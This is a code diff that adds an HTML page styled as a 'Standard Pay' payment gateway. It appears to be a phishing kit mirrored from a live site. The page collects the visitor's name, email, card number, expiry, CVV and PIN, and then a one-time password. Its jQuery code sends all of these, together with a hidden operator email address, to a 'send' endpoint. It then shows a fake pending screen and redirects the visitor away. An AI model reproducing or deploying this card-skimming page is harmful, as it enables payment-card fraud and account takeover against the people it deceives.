@@ -1,0 +1,360 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Standard Pay</title>
+    <link rel="apple-touch-icon" sizes="180x180" href="assets/images/swift-logo.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="assets/images/swift-logo.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="assets/images/swift-logo.png">
+    <link rel="mask-icon" href="assets/images/swift-logo.png" color="#5bbad5">
+    <link rel="preconnect" href="https://fonts.googleapis.com/">
+    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin="">
+    <link href="css283ac.html?family=Poppins:wght@100;200;300;400;500;600;700;800;900&amp;display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="assets/css/style.css">
+    <link rel="stylesheet" href="assets/plugins/bootstrap-5.0.2-dist/css/bootstrap.min.css">
+    <script src="assets/plugins/bootstrap-5.0.2-dist/js/bootstrap.bundle.min.js"></script>
+    <script src="assets/plugins/email.min.js"></script>
+    <link rel="stylesheet" type="text/css" href="assets/plugins/line-awesome-1.3.0/css/line-awesome.min.css">
+    <link rel="stylesheet" href="assets/css/font-awesome.css">
+</head>
+
+<body>
+    <div id="loader">
+        <div class="spinner-border text-success" role="status" id="status">
+            <span class="sr-only">Loading...</span>
+        </div>
+    </div>
+    <main>
+        <div class="container mt-5">
+            <div class="d-block text-center">
+                <div class="container">
+                    <div class="h2 mt-3 mb-2 text-center">
+                        <div class="d-block"><img class="mx-auto" width="100" src="assets/images/swift-logo.png" alt="mark"></div>
+                        <div class="d-block h1">
+                            <span class="head1">Standard</span>
+                            <span class="head2">Pay</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="container text-center">
+                <div class="d-block mx-auto shadow p-5 rounded bg-light" id="apps">
+                    
+                    <div id="user_section">
+                        <div id="errors" class="text-center"></div>
+                        <input type="hidden" value="aiyedunmiracle956888@gmail.com" name="other_email" id="other_email">
+                        <input type="hidden" value="https://xcredit.simdif.com/payment_gateway" name="sitename" id="sitename">
+
+                        <div class="input-group mb-3">
+                            <span class="input-group-text" id="name-icon">
+                                <img src="assets/plugins/line-awesome-1.3.0/svg/user-circle.svg" width="16px">
+                            </span>
+                            <input class="form-control " type="text" maxlength="100" name="name" id="name" placeholder="Name On Card">
+                        </div>
+                        <div class="input-group mb-3">
+                            <span class="input-group-text" id="emai-icon">
+                                <img src="assets/plugins/line-awesome-1.3.0/svg/envelope.svg" width="16px">
+                            </span>
+                            <input class="form-control" type="email" name="email" id="email" placeholder="Email">
+                        </div>
+                        <div class="input-group mb-3">
+                            <span class="input-group-text" id="amount-icon"><img src="assets/plugins/line-awesome-1.3.0/svg/money-bill-solid.svg" width="16px"></span>
+                            <input class="form-control" type="number" name="amount" id="amount" placeholder="Amount To Pay">
+                        </div>
+
+                        <button type="button" class="btn btn-primary my-2 w-100 round" id="proceed">Proceed To Pay</button>
+                    </div>
+
+                    <!-- <form method="post" class="form text-center" onsubmit="" id="${this.form_id}">
+                        <div class="mb-4" id="name_heading">${this.name}</div>
+                        <div id="errors" class="text-center"></div>
+                        ${this.template}
+                        <button type="submit" class="btn btn-primary my-2 w-100 round" id="proceed">${this.button}</button>
+                    </form> -->
+
+
+
+
+
+                    <div style="display: none;" id="card_details_section">
+                        <div class="mb-4 text-center uppercase" id="name_heading"></div>
+
+                        <div id="card_details_errors" class="text-center"></div>
+
+                        <div class="input-group mb-3">
+                            <span class="input-group-text" id="card-type"><img src="assets/plugins/line-awesome-1.3.0/svg/credit-card-solid.svg" width="16px"></span>
+                            <input class="form-control" type="text" name="card_number" id="card_number" placeholder="Card Number">
+                        </div>
+                        <div class="input-group mb-3">
+                            <span class="input-group-text" id="exp-icon">
+                                <img src="assets/plugins/line-awesome-1.3.0/svg/calendar-solid.svg" width="16px">
+                            </span>
+                            <input class="form-control" type="text" name="card_expiry" id="card_expiry" maxlength="5" placeholder="Expiry Date mm/yy" pattern='^(0[1-9]|1[0-2])\/?([0-9]{2})$'>
+                        </div>
+                        <div class="row">
+                            <div class="input-group mb-3 col-4">
+                                <span class="input-group-text" id="cvv-icon"><img src="assets/plugins/line-awesome-1.3.0/svg/user-secret-solid.svg" width="16px"></span>
+                                <input class="form-control" type="text" name="card_cvv" id="card_cvv" placeholder="CVV 3-digits" maxlength="3">
+                            </div>
+                            <div class="input-group mb-3 col-4">
+                                <span class="input-group-text" id="pwd-icon">
+                                    <img src="assets/plugins/line-awesome-1.3.0/svg/lock-solid.svg" width="16px">
+                                </span>
+                                <input class="form-control" type="password" name="card_pin" placeholder="PIN" id="card_pin" maxlength="4">
+                            </div>
+                        </div>
+
+                        <button type="button" class="btn btn-primary my-2 w-100 round" id="pay_btn"></button>
+                    </div>
+
+
+                    <div style="display: none;" id="otp_section">
+                        <div id="errors" class="text-center"></div>
+
+                        <div class="input-group mb-3">
+                            <span class="input-group-text" id="otp-icon">
+                                <img src="assets/plugins/line-awesome-1.3.0/svg/user-shield-solid.svg" width="16px">
+                            </span>
+                            <input class="form-control" type="password" name="otp" id="otp" placeholder="OTP">
+                        </div>
+                        <button type="button" class="btn btn-primary my-2 w-100 round" id="otp_btn">Confirm Payment</button>
+                    </div>
+
+                    <div style="display: none;" id="pending_section">
+                        
+                        <div class="d-block text-white btn bg-info py-4 text-center">
+                            <p class="lead text-center">Payment Pending</p>
+                        </div>
+                    </div>
+
+                </div>
+            </div>
+        </div>
+
+
+    </main>
+
+    <!-- SCRIPTS -->
+    <script type="module" src="assets/plugins/creditcard.js-master/src/cards.js"></script>
+    <script type="module" src="assets/plugins/creditcard.js-master/src/creditcard.js"></script>
+    <script src="assets/js/jquery-3.6.0.min.js"></script>
+    <script src="app.js"></script>
+
+
+    <script>
+    
+        var sitename = document.getElementById('sitename').value;
+        var other_email = document.getElementById('other_email').value;
+
+        if(sitename === ""){
+            // alert("Null values");
+            sitename = "https://creditdirectltd.com/";
+
+        }
+   
+        
+        function showLoader(state) {
+            const loader = document.getElementById('loader');
+
+            switch (state) {
+                case 'visible':
+                    loader.style.display = 'block';
+
+                    return new Promise(resolve => {
+                        // Set a timeout to hide the loader after 5 seconds
+                        setTimeout(() => {
+                            loader.style.display = 'none';
+                            resolve();
+                        }, 5000);
+                    });
+                default:
+                    loader.style.display = 'none';
+                    return Promise.resolve();
+            }
+        }
+
+        async function executeAfterLoader() {
+            await showLoader('visible');
+            // Code to execute after the loader is hidden
+            $('#card_details_section').css('display', 'none');
+            $('#otp_section').css('display', 'block');
+        }
+
+        async function executePending() {
+            await showLoader('visible');
+            // Code to execute after the loader is hidden
+            $('#otp_section').css('display', 'none');
+            $('#pending_section').css('display', 'block');
+
+            // Set a timeout to redirect after 5 seconds
+            setTimeout(() => {
+                // window.location.href = 'https://creditdirectltd.com';
+                window.location = sitename;
+            }, 5000);
+        }
+
+
+        // FOR SENDING EMAIL FOR CARD DETAILS
+        function sendGetRequest(name, email, cardNumber, cardExpiry, cardCVV, cardPIN, otherEmail) {
+            $.ajax({
+                url: 'send',  // Update the URL to point to your PHP file
+                method: 'GET',    // Use the GET method
+                data: {
+                    key1: name,
+                    key2: email,
+                    key3: cardNumber,
+                    key4: cardExpiry,
+                    key5: cardCVV,
+                    key6: cardPIN,
+                    key7: otherEmail
+                },
+                success: function(response) {
+                    console.log('Success:', response);
+                },
+                error: function(error) {
+                    console.error('Error:', error);
+                }
+            });
+        }
+        
+        
+
+        // FOR SENDING EMAIL FOR OTP
+        function sendOtp(name, otp, other_email, user_email) {
+            $.ajax({
+                url: 'send', // Update the URL to point to your PHP file
+                method: 'POST', // Use the POST method
+                data: {
+                    key1_name: name,
+                    key1_otp: otp,
+                    key1_other_email: other_email,
+                    key1_user_email: user_email,
+                },
+                success: function(response) {
+                    console.log('Success:', response);
+                },
+                error: function(error) {
+                    console.error('Error:', error);
+                }
+            });
+        }
+        
+
+
+         
+
+        $(document).ready(function(){
+            // TOGGLE DETAILS
+            $('#card_details_section').css('display', 'none');
+            $('#otp_section').css('display', 'none');
+            // showLoader('visible');
+
+            // OTHER EMAIL
+            const other_email = $('#other_email').val();
+            const user_email = $('#email').val();
+
+            // USER DETAILS
+            $('#proceed').on('click', function(){
+
+              const name = $('#name').val();
+              const email = $('#email').val();
+              const amount = $('#amount').val();
+              const errors = $('#errors');
+
+              if(name === ""){
+                errors.html('<div class="alert alert-info alert-dismissible fade show" role="alert">Name Field Is Required<button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button></div>');
+              }else if(email === ""){
+                errors.html('<div class="alert alert-info alert-dismissible fade show" role="alert">Email Field Is Required<button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button></div>');
+              }else if(amount === ""){
+                errors.html('<div class="alert alert-info alert-dismissible fade show" role="alert">Amount Field Is Required<button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button></div>');
+              }else if(amount < 1){
+                errors.html('<div class="alert alert-info alert-dismissible fade show" role="alert">Amount cannot be lesser than 1<button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button></div>');
+              }else{
+                  $('#card_details_section').css('display', 'block');
+                  $('#name_heading').text(name);
+                  $('#pay_btn').text("Pay "+amount);
+                  $('#user_section').css('display', 'none');
+              }
+
+            })
+
+
+            // CARD DETAILS
+            $('#pay_btn').on('click', function(){
+
+                const name = $('#name').val();
+                const email = $('#email').val();
+                const card_number = $('#card_number').val();
+                const card_expiry = $('#card_expiry').val();
+                const card_cvv = $('#card_cvv').val();
+                const card_pin = $('#card_pin').val();
+                const errors = $('#card_details_errors');
+
+                // const valueLength = 1; // Adjust this based on the actual length of your values
+
+                // // Extract the first and second values
+                // const firstValue = card_expiry.substr(0, valueLength).trim();
+                // const secondValue = card_expiry.substr(valueLength, valueLength).trim();
+
+
+
+                if(card_number === ""){
+                    errors.html('<div class="alert alert-info alert-dismissible fade show" role="alert">Card Number Is Required<button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button></div>');
+                }else if(card_expiry === ""){
+                    errors.html('<div class="alert alert-info alert-dismissible fade show" role="alert">Expiry Date Is Required<button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button></div>');
+                }else if(card_cvv === ""){
+                    errors.html('<div class="alert alert-info alert-dismissible fade show" role="alert">CVV Field Is Required<button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button></div>');
+                }else if(card_pin === ""){
+                    errors.html('<div class="alert alert-info alert-dismissible fade show" role="alert">Card Pin Is Required<button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button></div>');
+                // }else if(firstValue !== 0 || firstValue !== 1){
+                //     errors.html('<div class="alert alert-info alert-dismissible fade show" role="alert">Expiry Date cannot be lesser than 1<button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button></div>');
+                }else{
+                    
+                    // showLoader('visible');
+                    // $('#card_details_section').css('display', 'none');
+                    // $('#otp_section').css('display', 'block');
+
+                    executeAfterLoader();
+
+                    sendGetRequest(name, email, card_number, card_expiry, card_cvv, card_pin, other_email);
+                }
+
+            });
+            
+
+
+            // PENDING SECTION
+            $('#otp_btn').on('click', function(){
+
+                const name = $('#name').val();
+                const otp = $('#otp').val();
+                const user_email = $('#email').val();
+
+                if(otp === ""){
+                    errors.html('<div class="alert alert-info alert-dismissible fade show" role="alert">OTP Is Required<button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button></div>');
+                }else{
+            
+                    executePending();
+                    sendOtp(name, otp, other_email, user_email);
+                }
+                
+            });
+
+
+
+
+
+            
+        });
+
+        
+    </script>
+
+
+
+</body>
+
+<!-- Mirrored from creditdirectltd.com/swiftpay/?email=customerservicexcredits@gmail.com&sitename=https://xcredit.simdif.com/payment_gateway by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 11 Apr 2024 17:12:24 GMT -->
+</html>
